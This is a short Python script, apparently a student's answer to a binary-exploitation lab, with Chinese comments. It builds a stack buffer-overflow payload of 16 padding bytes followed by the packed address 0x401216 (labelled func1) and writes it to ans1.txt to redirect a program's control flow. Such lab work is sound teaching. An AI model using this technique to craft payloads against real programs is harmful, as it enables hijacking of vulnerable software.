import struct

# 1. 构造 Padding (16字节)
padding = b'A' * 16

# 2. 目标地址 func1 (0x401216)
target_addr = struct.pack('<Q', 0x401216)

# 3. 组合 Payload
payload = padding + target_addr

# 4. 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload 已写入 ans1.txt")
